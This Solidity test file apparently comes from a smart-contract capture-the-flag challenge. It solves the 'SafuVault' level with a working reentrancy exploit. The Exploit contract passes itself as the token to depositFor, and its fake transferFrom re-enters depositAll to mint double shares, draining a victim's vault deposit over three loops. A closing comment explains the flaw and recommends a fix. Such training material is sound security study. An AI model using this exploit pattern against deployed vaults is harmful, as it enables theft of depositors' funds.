// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// utilities
import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";

// core contracts
import {Token} from "src/other/Token.sol";
import {SafuStrategy} from "src/safu-vault/SafuStrategy.sol";
import {SafuVault, IStrategy} from "src/safu-vault/SafuVault.sol";

contract Testing is Test {
    address attacker = makeAddr("attacker");
    address o1 = makeAddr("o1");
    address o2 = makeAddr("o2");
    address admin = makeAddr("admin"); // should not be used
    address adminUser = makeAddr("adminUser"); // should not be used

    Token usdc;
    SafuVault safuVault;
    SafuStrategy safuStrategy;

    /// preliminary state
    function setUp() public {
        // funding accounts
        vm.deal(admin, 10_000 ether);
        vm.deal(attacker, 10_000 ether);
        vm.deal(adminUser, 10_000 ether);

        // deploying token contract
        vm.prank(admin);
        usdc = new Token("USDC", "USDC");

        address[] memory addresses = new address[](2);
        uint256[] memory amounts = new uint256[](2);

        addresses[0] = attacker;
        addresses[1] = adminUser;
        amounts[0] = 10_000e18;
        amounts[1] = 10_000e18;

        // attacker gets 10_000 USDC as starting funds
        vm.prank(admin);
        usdc.mintPerUser(addresses, amounts);

        // deploying core contracts
        vm.prank(admin);
        safuStrategy = new SafuStrategy(address(usdc));
        vm.prank(admin);
        safuVault = new SafuVault(IStrategy(address(safuStrategy)), "LP Token", "LP");

        vm.prank(admin);
        safuStrategy.setVault(address(safuVault));

        // other user deposits 10_000 USDC into the safu yield vault
        vm.prank(adminUser);
        usdc.approve(address(safuVault), type(uint256).max);
        vm.prank(adminUser);
        safuVault.depositAll();
    }

    /// solves the challenge
    function testChallengeExploit() public {
        vm.startPrank(attacker, attacker);

        Exploit attack = new Exploit(usdc, safuVault, attacker);
        console.log("attack address is:", address(attack));

        // doing repatedly because 1 iteraction will steal appr. 5000 usdc, 2nd-8333, and the 3rd-1976 usdc
        for (uint256 i = 0; i < 3; i++) {
            usdc.transfer(address(attack), 10_000 ether);
            attack.attack();
            attack.withdraw();
        }

        vm.stopPrank();

        validation();
    }

    /// expected final state
    function validation() public {
        // attacker drains >= 90% of funds
        uint256 totalVaultFunds = usdc.balanceOf(address(safuVault)) + usdc.balanceOf(address(safuStrategy));
        assertLe(totalVaultFunds, 1_000e18);
        assertGe(usdc.balanceOf(attacker), 19_000e18);
    }
}

contract Exploit {
    Token usdc;
    SafuVault target;
    address attacker;

    constructor(Token _usdc, SafuVault _target, address _attacker) {
        usdc = _usdc;
        target = _target;
        attacker = _attacker;
    }

    // using transferFrom instead of safeTransferFrom because under the hood safeTransferFrom calls transferFrom
    function transferFrom(address, address, uint256) public returns (bool) {
        target.depositAll();
        return true;
    }

    function attack() public {
        usdc.approve(address(target), type(uint256).max);
        target.depositFor(address(this), 10, address(this));
    }

    function withdraw() public {
        target.withdrawAll();
        usdc.transfer(attacker, usdc.balanceOf(address(this)));
    }
}

// the vulnerability in this contracts is double entry point into deposit functions and reentrancy possibility in depositFor.
// we call depositFor as if trying to deposit for some address, but instead using reentrancy and calling depositAll(deposit)
// as a result we get twice as much shares for a single deposit

// Recommendation: add reentrancy guard to deposit functions and remove arbitrary address call in depositFor, allowing only "want" token to be transfered
